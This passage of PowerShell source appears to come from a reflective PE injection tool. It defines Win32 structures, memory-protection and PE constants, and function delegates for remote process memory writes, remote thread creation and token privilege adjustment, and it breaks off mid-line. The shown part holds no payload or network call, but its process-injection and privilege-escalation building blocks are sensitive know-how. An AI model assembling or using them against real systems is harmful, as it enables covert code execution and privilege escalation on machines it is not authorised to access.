        $TypeBuilder.DefineField("Characteristics", [UInt32], "Public") | Out-Null
        $TypeBuilder.DefineField("TimeDateStamp", [UInt32], "Public") | Out-Null
        $TypeBuilder.DefineField("MajorVersion", [UInt16], "Public") | Out-Null
        $TypeBuilder.DefineField("MinorVersion", [UInt16], "Public") | Out-Null
        $TypeBuilder.DefineField("Name", [UInt32], "Public") | Out-Null
        $TypeBuilder.DefineField("Base", [UInt32], "Public") | Out-Null
        $TypeBuilder.DefineField("NumberOfFunctions", [UInt32], "Public") | Out-Null
        $TypeBuilder.DefineField("NumberOfNames", [UInt32], "Public") | Out-Null
        $TypeBuilder.DefineField("AddressOfFunctions", [UInt32], "Public") | Out-Null
        $TypeBuilder.DefineField("AddressOfNames", [UInt32], "Public") | Out-Null
        $TypeBuilder.DefineField("AddressOfNameOrdinals", [UInt32], "Public") | Out-Null
        $IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY

        $Attributes = "AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit"
        $TypeBuilder = $ModuleBuilder.DefineType("LUID", $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField("LowPart", [UInt32], "Public") | Out-Null
        $TypeBuilder.DefineField("HighPart", [UInt32], "Public") | Out-Null
        $LUID = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID

        $Attributes = "AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit"
        $TypeBuilder = $ModuleBuilder.DefineType("LUID_AND_ATTRIBUTES", $Attributes, [System.ValueType], 12)
        $TypeBuilder.DefineField("Luid", $LUID, "Public") | Out-Null
        $TypeBuilder.DefineField("Attributes", [UInt32], "Public") | Out-Null
        $LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES

        $Attributes = "AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit"
        $TypeBuilder = $ModuleBuilder.DefineType("TOKEN_PRIVILEGES", $Attributes, [System.ValueType], 16)
        $TypeBuilder.DefineField("PrivilegeCount", [UInt32], "Public") | Out-Null
        $TypeBuilder.DefineField("Privileges", $LUID_AND_ATTRIBUTES, "Public") | Out-Null
        $TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

        return $Win32Types
    }

 Function Get-Win32Constants
    {
        $Win32Constants = New-Object System.Object
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
        $Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
        $Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
        return $Win32Constants
    }

 Function Get-Win32Functions
    {
        $Win32Functions = New-Object System.Object

        $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
        $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc

        $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx

        $memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
        $memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
        $memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy

        $memsetAddr = Get-ProcAddress msvcrt.dll memset
        $memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
        $memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset

        $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
        $LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
        $LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary

        $GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
        $GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
        $GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress

        $GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress
        $GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
        $GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr

        $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
        $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree

        $VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
        $VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx

        $VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
        $VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect

        $GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
        $GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
        $GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
        $Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle

        $FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
        $FreeLibraryDelegate = Get-DelegateType @([IntPtr]) ([Bool])
        $FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary

        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess

        $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject

        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory

        $ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory

        $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread

        $GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread

        $OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken

        $GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread

        $AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges

        $Loo
